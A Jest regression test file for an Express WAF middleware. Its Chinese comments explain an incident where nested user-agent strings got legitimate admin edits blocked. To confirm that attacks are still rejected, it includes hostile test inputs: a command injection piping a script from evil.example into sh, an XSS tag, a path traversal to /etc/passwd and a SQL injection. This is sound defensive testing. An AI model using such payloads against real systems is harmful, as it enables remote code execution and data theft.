import { describe, expect, it, jest } from "@jest/globals";
import type { NextFunction, Request, Response } from "express";

/**
 * WAF body 白名单「深度无关」回归（生产事故：PUT /api/admin/users/:id 被 400）。
 *
 * 事实链路：管理端编辑用户时把整份用户文档回传，UA 串落在 `latestFingerprint.ua`
 * （第 2 层）。真实 UA 必带分号（`Mozilla/5.0 (Windows NT 10.0; Win64; x64) …`），
 * 而 `isSafeValue` 的“含危险字符即拦截”门槛会把分号判为危险字符，于是正常操作返回
 * `400 请求内容包含非法字符`，日志 `[WAF] 拦截可疑 body 字段: latestFingerprint.ua`。
 *
 * 白名单本来就注册了 `ua` / `userAgent`，但 `checkObject` 只在**顶层**匹配，
 * 嵌套字段一律走严格检查 —— 本用例把“白名单 key 在任意深度生效”钉成回归，
 * 同时确认豁免只是换成 relaxed 检查：攻击载荷仍被拦。
 */

jest.mock("../utils/logger", () => ({
  __esModule: true,
  default: { warn: jest.fn(), error: jest.fn(), info: jest.fn(), debug: jest.fn() },
}));

jest.mock("../routes", () => ({
  earlyRouteModules: [],
  postTamperRouteModules: [],
  preDocsRouteModules: [],
  preParserRouteModules: [],
  preTamperRouteModules: [],
  routeLimiterModules: [],
  getModuleScopes: () => [],
}));

jest.mock("../security/securityPolicy", () => ({ securityBypassPolicy: { waf: [] } }));

import { wafMiddleware } from "../middleware/wafMiddleware";

const CHROME_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36";

function makeReq(body: unknown): Request {
  return {
    path: "/api/admin/users/1774628475773",
    method: "PUT",
    ip: "203.0.113.10",
    body,
    query: {},
    headers: {},
  } as unknown as Request;
}

function run(body: unknown) {
  const status = jest.fn();
  const json = jest.fn();
  const res = { status: status.mockReturnThis(), json } as unknown as Response;
  const next = jest.fn() as unknown as NextFunction;
  wafMiddleware(makeReq(body), res, next);
  return { status, next };
}

describe("WAF × 嵌套字段白名单（latestFingerprint.ua 事故）", () => {
  it("用户文档回传里的 latestFingerprint.ua / latestFingerprint.ip 不被拦", () => {
    const { status, next } = run({
      id: "1774628475773",
      nickname: "测试用户",
      role: "user",
      latestFingerprint: {
        id: "fp_7c1d9e0a5b2f",
        ts: 1774628475773,
        ua: CHROME_UA,
        ip: "203.0.113.10",
      },
    });

    expect(status).not.toHaveBeenCalled();
    expect(next).toHaveBeenCalledTimes(1);
  });

  it("数组里的指纹记录同样按字段名豁免（fingerprints[0].ua / userAgent）", () => {
    const { status, next } = run({
      fingerprints: [
        { id: "fp_1", ts: 1774628475773, ua: CHROME_UA },
        { id: "fp_2", ts: 1774628475774, navigator: { userAgent: CHROME_UA } },
      ],
    });

    expect(status).not.toHaveBeenCalled();
    expect(next).toHaveBeenCalledTimes(1);
  });

  it("嵌套豁免只换成 relaxed 检查：命令注入 / XSS / 路径穿越仍被拦", () => {
    const injected = run({ latestFingerprint: { ua: "x; curl http://evil.example/s.sh | sh" } });
    expect(injected.status).toHaveBeenCalledWith(400);
    expect(injected.next).not.toHaveBeenCalled();

    const xss = run({ fingerprints: [{ ua: "<script>alert(1)</script>" }] });
    expect(xss.status).toHaveBeenCalledWith(400);
    expect(xss.next).not.toHaveBeenCalled();

    const traversal = run({ meta: { html: "../../etc/passwd" } });
    expect(traversal.status).toHaveBeenCalledWith(400);
    expect(traversal.next).not.toHaveBeenCalled();
  });

  it("非白名单嵌套字段仍是严格检查（没有整体放宽）", () => {
    const sqli = run({ meta: { nickname: "ops@example.com' OR 1=1 --" } });
    expect(sqli.status).toHaveBeenCalledWith(400);
    expect(sqli.next).not.toHaveBeenCalled();

    const plain = run({ meta: { nickname: "测试用户" } });
    expect(plain.status).not.toHaveBeenCalled();
    expect(plain.next).toHaveBeenCalledTimes(1);
  });
});
